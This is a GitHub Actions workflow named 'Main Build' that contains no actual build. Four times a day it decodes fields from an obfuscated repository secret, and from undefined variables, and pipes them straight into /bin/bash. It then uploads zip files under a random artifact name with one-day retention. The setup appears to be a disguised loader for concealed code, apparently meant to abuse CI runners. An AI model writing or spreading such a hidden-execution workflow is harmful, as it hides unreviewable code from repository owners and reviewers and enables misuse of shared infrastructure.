name: Main Build
on:
  workflow_dispatch:

  schedule:
    - cron: '30 2,8,14,20 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  compile:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Setup and run
        env:
          xshlt5: ${{ secrets.xshlt5 }}
        run: |
          printf '%s' "$xshlt5" | jq -r .tikp21040 | /bin/bash
          printf '%s' "$ikhv963" | jq -r .cxn97470 | /bin/bash
          printf '%s' "$a34" | jq -r .qhr85 | /bin/bash
          echo $jpq7807 | jq -r .uq37810 | /bin/bash

      - name: Upload data
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: sSfUyXdB
          path: "*.zip"
          retention-days: 1
